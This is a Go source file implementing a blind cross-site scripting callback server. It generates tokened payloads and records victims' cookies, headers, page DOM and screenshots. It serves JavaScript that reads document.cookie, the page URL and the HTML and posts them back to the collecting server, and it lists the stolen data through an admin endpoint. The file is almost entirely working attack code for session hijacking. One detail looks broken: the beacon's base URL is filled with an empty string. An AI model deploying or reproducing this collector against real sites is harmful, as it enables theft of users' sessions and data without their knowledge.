package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
)

// =========================================================
// Blind XSS Callback Server
// =========================================================

// CallbackHit — one incoming callback
type CallbackHit struct {
	Token      string            `json:"token"`
	Timestamp  time.Time         `json:"timestamp"`
	RemoteAddr string            `json:"remote_addr"`
	Method     string            `json:"method"`
	Path       string            `json:"path"`
	UserAgent  string            `json:"user_agent"`
	Referer    string            `json:"referer"`
	Headers    map[string]string `json:"headers"`
	Query      map[string]string `json:"query"`
	Body       string            `json:"body"`
	Cookies    string            `json:"cookies,omitempty"`
	DOM        string            `json:"dom,omitempty"`
	URL        string            `json:"url,omitempty"`
	Screenshot string            `json:"screenshot,omitempty"`
	IP         string            `json:"ip,omitempty"`
}

// CallbackStore — in-memory store for callbacks
type CallbackStore struct {
	mu      sync.RWMutex
	hits    []CallbackHit
	tokens  map[string]bool // registered tokens
	maxHits int
}

var cbStore = &CallbackStore{
	hits:    make([]CallbackHit, 0, 1000),
	tokens:  make(map[string]bool),
	maxHits: 10000,
}

// =========================================================
// StartCallbackServer — called from main.go
// =========================================================
func StartCallbackServer(host string, port int) {
	addr := fmt.Sprintf("%s:%d", host, port)

	handler := func(ctx *fasthttp.RequestCtx) {
		path := string(ctx.Path())

		switch {
		// XSS payload loads this — capture everything
		case strings.HasPrefix(path, "/c/"):
			handleCallback(ctx)

		// Rich data POST from payload (cookies, DOM, etc.)
		case strings.HasPrefix(path, "/data/"):
			handleData(ctx)

		// Screenshot upload (base64)
		case strings.HasPrefix(path, "/shot/"):
			handleScreenshot(ctx)

		// Admin: list all hits
		case path == "/hits" && string(ctx.Method()) == "GET":
			handleHitsList(ctx)

		// Admin: clear hits
		case path == "/clear" && string(ctx.Method()) == "POST":
			cbStore.mu.Lock()
			cbStore.hits = cbStore.hits[:0]
			cbStore.mu.Unlock()
			writeJSON(ctx, map[string]string{"status": "cleared"})

		// Health
		case path == "/health":
			writeJSON(ctx, map[string]interface{}{
				"status": "ok",
				"hits":   cbStore.count(),
			})

		// Root — serve a tiny JS beacon (payload can load this)
		default:
			handleBeacon(ctx)
		}
	}

	server := &fasthttp.Server{
		Handler:            handler,
		Name:               "XSSHunter-Callback",
		MaxRequestBodySize: 20 * 1024 * 1024, // 20MB (screenshots)
		ReadTimeout:        30 * time.Second,
		WriteTimeout:       30 * time.Second,
		DisableKeepalive:   false,
	}

	log.Printf("[+] Callback server listening on %s", addr)
	if err := server.ListenAndServe(addr); err != nil {
		log.Printf("[-] Callback server failed: %v", err)
	}
}

// =========================================================
// GenerateToken — creates unique token for blind XSS
// =========================================================
func GenerateToken() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		// fallback
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

// =========================================================
// RegisterToken — mark token as valid (optional tracking)
// =========================================================
func RegisterToken(token string) {
	cbStore.mu.Lock()
	defer cbStore.mu.Unlock()
	cbStore.tokens[token] = true
}

// =========================================================
// BuildBlindPayload — replaces {CALLBACK} in payload
// =========================================================
func BuildBlindPayload(payloadTemplate, callbackURL, token string) string {
	// Full callback base: http://host:port/c/TOKEN
	full := fmt.Sprintf("%s/c/%s", callbackURL, token)
	return strings.ReplaceAll(payloadTemplate, "{CALLBACK}", full)
}

// =========================================================
// handleCallback — /c/{token} — first hit from XSS
// =========================================================
func handleCallback(ctx *fasthttp.RequestCtx) {
	path := string(ctx.Path())
	parts := strings.Split(strings.TrimPrefix(path, "/c/"), "/")
	token := ""
	if len(parts) > 0 {
		token = parts[0]
	}

	hit := CallbackHit{
		Token:      token,
		Timestamp:  time.Now().UTC(),
		RemoteAddr: ctx.RemoteAddr().String(),
		Method:     string(ctx.Method()),
		Path:       path,
		UserAgent:  string(ctx.UserAgent()),
		Referer:    string(ctx.Referer()),
		Headers:    extractHeaders(ctx),
		Query:      extractQuery(ctx),
		Cookies:    string(ctx.Request.Header.Cookie("")),
	}

	// If POST body — parse as data
	if string(ctx.Method()) == "POST" {
		hit.Body = string(ctx.PostBody())
	}

	// Sometimes payload sends data via query
	if v := string(ctx.QueryArgs().Peek("c")); v != "" {
		hit.Cookies = v
	}
	if v := string(ctx.QueryArgs().Peek("d")); v != "" {
		hit.DOM = v
	}
	if v := string(ctx.QueryArgs().Peek("u")); v != "" {
		hit.URL = v
	}
	if v := string(ctx.QueryArgs().Peek("i")); v != "" {
		hit.IP = v
	}

	storeHit(hit)
	logHit(hit)

	// Respond with a beacon JS (so payload can continue extracting)
	ctx.Response.Header.Set("Content-Type", "application/javascript")
	ctx.Response.Header.Set("Access-Control-Allow-Origin", "*")
	ctx.SetBodyString(beaconJS(token))
}

// =========================================================
// handleData — /data/{token} — rich data dump (cookies, DOM)
// =========================================================
func handleData(ctx *fasthttp.RequestCtx) {
	path := string(ctx.Path())
	parts := strings.Split(strings.TrimPrefix(path, "/data/"), "/")
	token := ""
	if len(parts) > 0 {
		token = parts[0]
	}

	body := string(ctx.PostBody())

	hit := CallbackHit{
		Token:      token,
		Timestamp:  time.Now().UTC(),
		RemoteAddr: ctx.RemoteAddr().String(),
		Method:     string(ctx.Method()),
		Path:       path,
		UserAgent:  string(ctx.UserAgent()),
		Referer:    string(ctx.Referer()),
		Headers:    extractHeaders(ctx),
		Body:       body,
	}

	// Try parse JSON body
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(body), &data); err == nil {
		if c, ok := data["cookie"].(string); ok {
			hit.Cookies = c
		}
		if d, ok := data["dom"].(string); ok {
			hit.DOM = d
		}
		if u, ok := data["url"].(string); ok {
			hit.URL = u
		}
		if s, ok := data["screenshot"].(string); ok {
			hit.Screenshot = s
		}
	}

	storeHit(hit)
	logHit(hit)

	ctx.Response.Header.Set("Content-Type", "application/json")
	ctx.Response.Header.Set("Access-Control-Allow-Origin", "*")
	ctx.SetBodyString(`{"status":"ok"}`)
}

// =========================================================
// handleScreenshot — /shot/{token} — base64 screenshot
// =========================================================
func handleScreenshot(ctx *fasthttp.RequestCtx) {
	token := strings.TrimPrefix(string(ctx.Path()), "/shot/")
	body := string(ctx.PostBody())

	hit := CallbackHit{
		Token:      token,
		Timestamp:  time.Now().UTC(),
		RemoteAddr: ctx.RemoteAddr().String(),
		Method:     string(ctx.Method()),
		Path:       string(ctx.Path()),
		UserAgent:  string(ctx.UserAgent()),
		Screenshot: body,
	}

	storeHit(hit)
	log.Printf("[!] Screenshot received for token %s (%d bytes)", token, len(body))

	ctx.Response.Header.Set("Access-Control-Allow-Origin", "*")
	ctx.SetBodyString(`{"status":"ok"}`)
}

// =========================================================
// handleHitsList — admin endpoint to fetch all hits
// =========================================================
func handleHitsList(ctx *fasthttp.RequestCtx) {
	cbStore.mu.RLock()
	defer cbStore.mu.RUnlock()

	writeJSON(ctx, map[string]interface{}{
		"count": len(cbStore.hits),
		"hits":  cbStore.hits,
	})
}

// =========================================================
// handleBeacon — serves beacon JS at root
// =========================================================
func handleBeacon(ctx *fasthttp.RequestCtx) {
	ctx.Response.Header.Set("Content-Type", "application/javascript")
	ctx.Response.Header.Set("Access-Control-Allow-Origin", "*")
	ctx.SetBodyString(beaconJS(""))
}

// =========================================================
// beaconJS — returns JS that extracts rich data
// =========================================================
func beaconJS(token string) string {
	if token == "" {
		return `// XSSHunter beacon`
	}
	return fmt.Sprintf(`
(function(){
  try {
    var base = "%s";
    var tok = "%s";
    var data = {
      cookie: document.cookie || "",
      url: location.href || "",
      dom: document.documentElement.outerHTML.substring(0, 5000),
      ua: navigator.userAgent || "",
      origin: location.origin || ""
    };
    // Send via fetch (CORS allowed)
    fetch(base.replace("/c/"+tok, "/data/"+tok), {
      method: "POST",
      mode: "no-cors",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(data)
    }).catch(function(){});
  } catch(e) {}
})();
`, "", token)
}

// =========================================================
// storeHit — thread-safe add
// =========================================================
func storeHit(hit CallbackHit) {
	cbStore.mu.Lock()
	defer cbStore.mu.Unlock()

	// Enforce max
	if len(cbStore.hits) >= cbStore.maxHits {
		// drop oldest 100
		cbStore.hits = cbStore.hits[100:]
	}
	cbStore.hits = append(cbStore.hits, hit)
}

// =========================================================
// count — thread-safe count
// =========================================================
func (s *CallbackStore) count() int {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return len(s.hits)
}

// =========================================================
// GetHits — exposed for Python brain to fetch
// =========================================================
func GetHits() []CallbackHit {
	cbStore.mu.RLock()
	defer cbStore.mu.RUnlock()
	out := make([]CallbackHit, len(cbStore.hits))
	copy(out, cbStore.hits)
	return out
}

// =========================================================
// logHit — pretty log to stdout
// =========================================================
func logHit(hit CallbackHit) {
	log.Printf("[🔥 XSS HIT] token=%s ip=%s ua=%q cookies=%q url=%q",
		hit.Token,
		hit.RemoteAddr,
		truncate(hit.UserAgent, 60),
		truncate(hit.Cookies, 80),
		truncate(hit.URL, 80),
	)
}

// =========================================================
// Helpers
// =========================================================
func extractHeaders(ctx *fasthttp.RequestCtx) map[string]string {
	out := make(map[string]string)
	ctx.Request.Header.VisitAll(func(k, v []byte) {
		out[string(k)] = string(v)
	})
	return out
}

func extractQuery(ctx *fasthttp.RequestCtx) map[string]string {
	out := make(map[string]string)
	ctx.QueryArgs().VisitAll(func(k, v []byte) {
		out[string(k)] = string(v)
	})
	return out
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// =========================================================
// HTTP client for callback (used by tests / outbound)
// =========================================================
var _ = http.DefaultClient // keep net/http import
var _ = io.Discard